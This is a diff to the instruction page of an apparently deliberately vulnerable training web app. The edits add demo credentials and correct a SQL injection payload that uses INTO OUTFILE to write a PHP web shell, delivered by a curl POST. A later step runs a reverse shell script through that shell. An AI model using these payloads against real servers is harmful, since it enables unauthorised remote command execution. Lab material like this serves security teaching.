@@ -37,6 +37,7 @@
 			<p>
                 This is a web form that that doesn't cleanse the variables in the backend. Follow the instructions to gain shell access to the server.</p>
 			</p>
+        <p>There are two users, `john` and `mary` with `password` being the password for both.</p>
         
         <h3>Login Form</h3>
         <form method="POST" action="">
@@ -70,7 +71,7 @@
             <p>Use the <em>into outfile</em> MySQL command to create a PHP script on the server that will run our commands.</p>
             <p>Password: <em class="input">mypass');SELECT "&lt;?php system($_GET['cmd']);" INTO OUTFILE "/var/www/web/images/system.php";'</em></p>
             <p><strong>Note:</strong> We need to use cURL here as the opening PHP tag causes issues in the browser.</p>
-            <p><em class="input">curl -X POST "http://192.168.30.99/login.php" --data "username=damien&amp;password=mypass');SELECT \"&lt;?php system($_GET['cmd'])\" INTO OUTFILE \"/var/www/web/images/system.php\";'"</em></p>
+            <p><em class="input">curl -X POST "http://192.168.30.99/login.php" --data "username=damien&amp;password=mypass');SELECT \"&lt;?php system(\$_GET['cmd']);\" INTO OUTFILE \"/var/www/web/images/system.php\";'"</em></p>
             <div class="code-block">
                 <h4>Resulting SQL</h4>
                 <p>
@@ -110,7 +111,7 @@
             <h2>Step 5</h2>
 			<h4>Run the downloaded reverse shell</h4>
 			<p>
-			    <a href="http://<?= HOST ?>/images/system.php?cmd=python%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/system.php?cmd=python /tmp/reverse-shell.py</a>
+			    <a href="http://<?= HOST ?>/images/system.php?cmd=/tmp/reverse-shell.py">http://<?= HOST ?>/images/system.php?cmd=/tmp/reverse-shell.py</a>
 			</p>
         </div>
 
